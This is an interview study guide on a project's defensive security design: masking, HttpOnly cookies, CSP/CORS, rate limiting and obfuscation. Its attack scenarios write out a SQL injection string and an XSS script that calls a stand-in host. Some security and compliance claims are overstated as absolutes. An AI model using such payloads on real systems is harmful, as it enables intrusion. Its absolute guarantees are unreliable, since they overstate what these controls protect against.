# Security & Resilience Master: Defense in Depth

NexGen implements an industry-standard "Defense in Depth" strategy to protect proprietary insurance data and customer privacy.

## 1. PII Masking vs. AES Encryption
In an interview, you'll be asked why we didn't just "encrypt everything."
- **Encryption**: High CPU overhead, complex key management (KMS/Vault). Only use when you *need* the raw data back.
- **Masking (NexGen Approach)**: Irreversible anonymization at the application layer. (e.g., `Johnny` → `J****`).
- **Benefit**: Provides 100% security against database leaks without the performance penalty of decryption during calculation cycles.

## 2. HttpOnly Cookie Authentication
We avoid `LocalStorage` for JWT storage.
- **Why?**: LocalStorage is accessible by any JavaScript on the page (Subject to XSS attacks).
- **HttpOnly**: The browser stores the token but *prevents* JS from reading it. The backend injects it directly. This makes "Token Theft" virtually impossible for an external attacker.

## 3. Web Hardening (CSP & CORS)
1. **Strict Content Security Policy (CSP)**: Disables `unsafe-eval` and restricts script execution to trusted domains. This stops "Malicious Code Injection."
2. **Restrictive CORS**: The API only accepts requests from an explicit allow-list (e.g., `https://nexgen.com`). This stops "Cross-Origin Data Scraping."

## 4. Security War Cases (Failover & Defense)

### Case 1: The "Brute Force" Scenario
**Situation**: An attacker attempts to guess a user password by making 10,000 requests.
- **Defense**: The Redis-backed rate limiter detects the IP spike.
- **Outcome**: The worker stops processing the request at the middleware layer and returns a `429 Too Many Requests`. The password-hashing CPU load (Bcrypt) never even triggers.

### Case 2: The "SQL Injection" Attempt
**Situation**: A malicious user sends `' OR 1=1 --` in the login field.
- **Defense**: We use **Parameterized Queries** via the ORM/Query Builder.
- **Outcome**: The input is treated as a literal string, not code. The database simply returns "User not found."

### Case 3: The "XSS / Script Injection" War Case
**Situation**: A user tries to upload their name as `<script>fetch('malicious.com')</script>`.
- **Defense**: Content Security Policy (CSP) blocks all inline scripts and unauthorized domains.
- **Outcome**: The browser identifies the script as a policy violation and refuses to execute it, keeping other users' cookies safe.

## 5. Proprietary Code Obfuscation
Insurance companies often want to protect their calculation logic (the "Mathematical Engine").
- **Implementation**: We use **Javascript-Obfuscator** during the build stage.
- **Effect**: It transforms the clear, human-readable source code into an unreadable string array, protecting intellectual property from reverse engineering.

## 5. Interview Talking Points:
- **"How do you stop XSS attacks?"**: We use HttpOnly cookies for session storage and a strict CSP to block untrusted script execution.
- **"What is the Chicken-Egg problem in your code?"**: It's the startup race condition between the API and the Database. We solved it with a robust, self-healing connection retry loop.
- **"How is your project HIPAA/GDPR compliant?"**: Through irreversible PII masking and TLS 1.3 encryption in transit.
